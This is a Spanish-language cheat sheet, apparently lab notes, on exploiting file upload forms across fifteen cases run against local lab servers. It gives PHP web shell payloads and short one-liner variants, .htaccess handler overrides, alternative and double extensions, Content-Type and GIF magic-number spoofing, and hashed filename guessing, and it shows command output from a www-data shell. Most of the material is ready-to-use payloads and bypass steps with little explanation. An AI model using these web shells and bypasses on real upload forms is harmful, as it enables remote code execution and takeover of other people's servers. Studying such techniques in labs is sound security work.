> 🎯 _Guía práctica para identificar, explotar y bypassar restricciones en sistemas de subida de archivos_

---

## 🧪 Caso 1: Sin sanitización ❌

🛠️ **Payload:**

php

Copiar código

`<?php system($_GET['cmd']); ?>`

🔍 **Pasos:**

1. Subimos el script PHP sin restricciones.
    
2. Usamos herramientas como **Gobuster** para encontrar la ruta de subida.
    
3. Ejecutamos comandos directamente vía `?cmd=id`.
    

✅ **Exploit:**  
`http://localhost/uploads/cmd.php?cmd=id`

---

## 🧪 Caso 2: Restricción por extensión (validación client-side) 🎭

🎯 Extensiones permitidas: `.gif`, `.jpg`, `.png`

🔍 **Bypass:**

1. Inspeccionamos con `Ctrl + Shift + C` en el navegador.
    
2. Eliminamos la validación HTML (JS).
    
3. Subimos el archivo PHP sin problemas.
    

💡 _La validación solo estaba en el navegador, no en el servidor._

---

## 🧪 Caso 3: Validación server-side ❌ `.php` bloqueado

🧠 Referencia: HackTricks – File Upload Tricks

📌 **Bypass usando `.php5`**  
Subimos `cmd.php5` →  
✅ `http://localhost:9001/upload10/uploads/cmd.php5?cmd=id`

---

## 🧪 Caso 4: `.pht` como extensión alternativa

📌 **Bypass con `.pht`**

✅ `http://localhost:9001/upload11/uploads/cmd.pht?cmd=id`

---

## 🧪 Caso 5: `.htaccess` para redefinir el intérprete 📜

🧩 Subimos archivo `.htaccess` con:

apache

Copiar código

`AddType application/x-httpd-php .test`

Luego subimos `pwned.test`:

php

Copiar código

`<?php system($_GET['cmd']); ?>`

🎯 **Content-Type:** Cambiar entre `text/plain` y `application/x-php`

✅ Ejecución: `http://localhost/pwned.test?cmd=id`

---

## 🧪 Caso 6: Restricción de tamaño 📏

📌 **MAX_FILE_SIZE interceptado con Burp:**

- Cambiar de `30` a `80`
    

🩹 **Alternativa:** Reducir payload con One-Liner:

php

Copiar código

``<?=`$_GET[0]`?>``

---

## 🧪 Caso 7: Validación de tamaño en el servidor 🧱

🔁 Enviamos al **Repeater**  
📌 Bypass con versión corta del payload:

php

Copiar código

``<?=`$_GET[cmd]`?>``

---

## 🧪 Caso 8: Restricción por tipo de archivo 🔐

📋 Modificamos el **Content-Type**:

- Original: `application/x-php`
    
- Bypass: `image/jpg`
    

📌 También se puede modificar el **magic number**:

php

Copiar código

`GIF8; <?php system($_GET['cmd']); ?>`

---

## 🧪 Caso 9: Validación GIF (magic number) 🎭

📌 Payload con magic number y Content-Type:

http

Copiar código

`Content-Type: image/gif GIF8; <?php system($_GET['cmd']); ?>`

✅ Ejecutar como `.php` en URL

---

## 🧪 Caso 10: Hashing del nombre de archivo con MD5 🔐

📌 Comando:

bash

Copiar código

`echo -n "cmd" | md5sum`

📍 Resultado:  
`http://localhost:9001/upload31/uploads/<hash>.php?cmd=id`

---

## 🧪 Caso 11: Hash del nombre completo (`cmd.php`) con MD5

bash

Copiar código

`echo -n "cmd.php" | md5sum`

✅ Ejecutar:  
`http://localhost:9001/upload32/uploads/<hash>.php?cmd=id`

---

## 🧪 Caso 12: Hash con SHA1 🧾

📌 Se requiere **Gobuster** para descubrir rutas basadas en hash SHA1

---

## 🧪 Caso 13: Doble extensión 📁

📌 Payload:  
`cmd.jpg.php`

🧠 Bypass común en servidores que validan solo la última extensión.

---

## 🧪 Caso 14: El archivo se descarga 🧲

📌 Solución:

bash

Copiar código

`curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php" -G --data-urlencode "cmd=id"`

✅ Resultado:  
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## 🧪 Caso 15: Bypass con `.htaccess` (nuevamente) 🧩

📄 Cargamos `.htaccess` para redefinir tipo MIME  
Luego subimos archivo con extensión `.test` y ejecutamos PHP

---

### 📚 Recursos útiles:

- HackTricks – File Upload
    
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload)
